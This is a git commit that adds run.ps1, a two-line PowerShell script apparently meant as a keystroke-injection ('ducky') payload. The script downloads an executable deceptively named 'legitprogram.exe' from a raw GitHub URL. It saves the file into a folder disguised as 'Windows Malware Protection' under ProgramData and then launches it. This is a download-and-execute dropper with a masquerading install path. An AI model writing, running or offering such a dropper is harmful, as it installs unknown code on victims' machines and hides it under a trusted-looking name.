bff379f82fa1b41455f0b4795ddd5936423ea39f
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-01 12:41:43 +0000

    Create run.ps1

---
+++ run.ps1
@@ -0,0 +1,2 @@
+Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/legitprogram.exe -OutFile "C:\ProgramData\Windows Malware Protection\legitprogram.exe"
+Start-Process 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
